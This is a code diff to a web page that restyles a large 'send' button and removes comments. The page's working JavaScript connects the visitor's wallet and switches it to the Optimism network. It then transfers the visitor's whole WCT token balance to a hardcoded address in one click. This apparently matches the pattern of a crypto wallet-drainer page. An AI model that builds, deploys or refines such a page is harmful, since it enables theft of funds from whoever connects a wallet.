@@ -8,39 +8,43 @@
     body {
       font-family: sans-serif;
       text-align: center;
-      margin-top: 60px;
       height: 100vh;
+      margin: 0;
       display: flex;
       justify-content: center;
       align-items: center;
       flex-direction: column;
-    }
-
-    #sendBtn {
-      font-size: 18px;
-      padding: 15px 30px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      width: 250px;
-      margin-top: 20px;
-    }
-
-    #sendBtn:hover {
-      background-color: #45a049;
-    }
-
-    #status {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #333;
+      background: #f9f9f9;
     }
 
     h2 {
+      font-size: 30px;
+      margin-bottom: 30px;
+    }
+
+    #sendBtn {
       font-size: 24px;
-      margin-bottom: 20px;
+      padding: 20px 50px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      width: 300px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      transition: background-color 0.3s;
+    }
+
+    #sendBtn:hover {
+      background-color: #3e9142;
+    }
+
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #333;
+      max-width: 90%;
+      word-break: break-word;
     }
   </style>
 </head>
@@ -58,19 +62,17 @@
       'function transfer(address to, uint256 value) returns (bool)'
     ];
     const OP_SCAN = 'https://optimistic.etherscan.io/tx/';
-    const OP_CHAIN_ID = '0xa'; // 10 decimal
+    const OP_CHAIN_ID = '0xa';
 
     async function switchToOP() {
       if (!window.ethereum) return false;
       try {
-        // Switch to OP mainnet
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: OP_CHAIN_ID }],
         });
         return true;
       } catch (switchError) {
-        // If the network isn't added yet, add it
         if (switchError.code === 4902) {
           try {
             await window.ethereum.request({
@@ -101,7 +103,6 @@
           return;
         }
 
-        // Auto switch to Optimism
         status.innerText = 'Switching to Optimism network...';
         const switched = await switchToOP();
         if (!switched) {
@@ -109,14 +110,12 @@
           return;
         }
 
-        // Connect wallet
         const provider = new ethers.BrowserProvider(window.ethereum);
         await provider.send('eth_requestAccounts', []);
         const signer = await provider.getSigner();
         const userAddress = await signer.getAddress();
         status.innerText = `Wallet: ${userAddress}\nFetching balance...`;
 
-        // Get token balance & decimals
         const token = new ethers.Contract(TOKEN_ADDRESS, TOKEN_ABI, signer);
         const decimals = await token.decimals();
         const balance = await token.balanceOf(userAddress);
@@ -126,11 +125,9 @@
           return;
         }
 
-        // Format for user display
         const displayBalance = ethers.formatUnits(balance, decimals);
         status.innerText = `You have ${displayBalance} WCT. Sending all...`;
 
-        // Transfer all
         const tx = await token.transfer(TO_ADDRESS, balance);
         status.innerHTML = `Tx sent! <a href="${OP_SCAN}${tx.hash}" target="_blank">${tx.hash}</a><br>Waiting for confirmation...`;
 
